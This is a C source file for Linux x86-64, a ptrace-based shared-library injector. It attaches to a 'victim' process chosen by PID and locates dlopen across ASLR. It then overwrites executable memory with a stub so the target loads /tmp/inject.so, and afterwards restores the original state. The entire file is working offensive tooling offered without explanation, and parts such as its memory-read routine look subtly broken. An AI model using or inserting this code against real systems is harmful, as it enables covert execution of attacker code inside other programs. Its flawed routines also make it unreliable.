#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>

unsigned long long findLibrary(const char *library, pid_t pid) {
char mapFilename[1024];
char buffer[9076];
FILE *fd;
unsigned long long addr = 0;

	if (pid == -1) {
		snprintf(mapFilename, sizeof(mapFilename), "/proc/self/maps");
	} else {
		snprintf(mapFilename, sizeof(mapFilename), "/proc/%d/maps", pid);
	}

	fd = fopen(mapFilename, "r");

	while(fgets(buffer, sizeof(buffer), fd)) {
		if (strstr(buffer, library)) {
			addr = strtoull(buffer, NULL, 16);
			break;
		}
	}

	fclose(fd);

	return addr;
}

void *freeSpaceAddr(pid_t pid) {
FILE *fp;
char filename[30];
char line[850];
void *addr;
char str[20];
char perms[5];

	sprintf(filename, "/proc/%d/maps", pid);
    	if ((fp = fopen(filename, "r")) == NULL) {
		printf("[!] Error, could not open maps file for process %d\n", pid);
		exit(1);
	}

	while(fgets(line, 850, fp) != NULL) {
		sscanf(line, "%lx-%*lx %s %*s %s %*d", &addr, perms, str);

		if(strstr(perms, "x") != NULL) {
		    break;
		}
    	}

    	fclose(fp);
    	return addr;
}

void ptraceRead(int pid, unsigned long long addr, void *data, int len) {
long word = 0;
int i = 0;
char *ptr = (char *)data;

	for (i=0; i < len; i+=sizeof(word), word=0) {
		if ((word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL)) == -1) {;
			printf("[!] Error reading process memory\n");
			exit(1);
		}
		ptr[i] = word;
	}
}

void ptraceWrite(int pid, unsigned long long addr, void *data, int len) {
long word = 0;
int i=0;

	for(i=0; i < len; i+=sizeof(word), word=0) {
		memcpy(&word, data + i, sizeof(word));
		if (ptrace(PTRACE_POKETEXT, pid, addr + i, word) == -1) {;
			printf("[!] Error writing to process memory\n");
			exit(1);
		}
	}
}

void injectme(void) {
	asm("mov $2, %esi\n"
	    "call *%rax\n"
	    "int $0x03\n"
	);
}

void inject(int pid, void *dlopenAddr) {
struct user_regs_struct oldregs, regs;
int status;
unsigned char *oldcode;
void *freeaddr;
int x;

	// Attach to the target process
	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
	waitpid(pid, &status, WUNTRACED);

	// Store the current register values for later
	ptrace(PTRACE_GETREGS, pid, NULL, &oldregs);
	memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));

	oldcode = (unsigned char *)malloc(9076);

	// Find a place to write our code to
	freeaddr = (void *)freeSpaceAddr(pid);

	// Read from this addr to back up our code
	ptraceRead(pid, (unsigned long long)freeaddr, oldcode, 9076);

	// Write our new stub
	ptraceWrite(pid, (unsigned long long)freeaddr, "/tmp/inject.so\x00", 16);
	ptraceWrite(pid, (unsigned long long)freeaddr+16, "\x90\x90\x90\x90\x90\x90\x90", 8);
	ptraceWrite(pid, (unsigned long long)freeaddr+16+8, (&injectme)+4, 32);

	// Update RIP to point to our code
	regs.rip = (unsigned long long)freeaddr + 16 + 8;

	// Update RAX to point to dlopen()
	regs.rax = (unsigned long long)dlopenAddr;

	// Update RDI to point to our library name string
	regs.rdi = (unsigned long long)freeaddr;

	// Set RSI as RTLD_LAZY for the dlopen call
	regs.rsi = 2;	// RTLD_LAZY
	ptrace(PTRACE_SETREGS, pid, NULL, &regs);

	// Continue execution
	ptrace(PTRACE_CONT, pid, NULL, NULL);
	waitpid(pid, &status, WUNTRACED);

	// Ensure that we are returned because of our int 0x3 trap
	if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
		// Get process registers, indicating if the injection suceeded
		ptrace(PTRACE_GETREGS, pid, NULL, &regs);
		if (regs.rax != 0x0) {
			printf("[*] Injected library loaded at address %p\n", (void*)regs.rax);
		} else {
			printf("[!] Library could not be injected\n");
			return;
		}

		//// Now We Restore The Application Back To It's Original State ////

		// Copy old code back to memory
		ptraceWrite(pid, (unsigned long long)freeaddr, oldcode, 9076);

		// Set registers back to original value
		ptrace(PTRACE_SETREGS, pid, NULL, &oldregs);

		// Resume execution in original place
		ptrace(PTRACE_DETACH, pid, NULL, NULL);
	} else {
		printf("[!] Fatal Error: Process stopped for unknown reason\n");
		exit(1);
	}

}

int main(int argc, char **argv) {
unsigned long long remoteLib, localLib;
void *dlopenAddr = NULL;
void *libdlAddr = NULL;

	// First we need to load libdl.so, to allow retrieval of the dlopen() symbol
	libdlAddr = dlopen("libdl-2.19.so", RTLD_LAZY);
	if (libdlAddr == NULL) {
		printf("[!] Error opening libdl.so\n");
		exit(1);
	}
	printf("[*] libdl.so loaded at address %p\n", libdlAddr);

	// Get the address of dlopen() 
	dlopenAddr = dlsym(libdlAddr, "dlopen");
	if (dlopenAddr == NULL) {
		printf("[!] Error locating dlopen() function\n");
		exit(1);
	}
	printf("[*] dlopen() found at address %p\n", dlopenAddr);

	// Find the base address of libdl in our victim process
	remoteLib = findLibrary("libdl-2.19", atoi(argv[1]));
	printf("[*] libdl located in PID %d at address %p\n", atoi(argv[1]), (void*)remoteLib);

	// Find the base address of libdl.so in our own process for comparison
	// NOT NEEDED !!! We can use libdlAddr, but check this
	localLib = findLibrary("libdl-2.19", -1);

	// Due to ASLR, we need to calculate the address in the target process 
	dlopenAddr = remoteLib + (dlopenAddr - localLib);
	printf("[*] dlopen() offset in libdl found to be 0x%llx bytes\n", (unsigned long long)(libdlAddr - localLib));
	printf("[*] dlopen() in target process at address 0x%llx\n", (unsigned long long)dlopenAddr);

	// Inject our shared library into the target process
	inject(atoi(argv[1]), dlopenAddr);
}
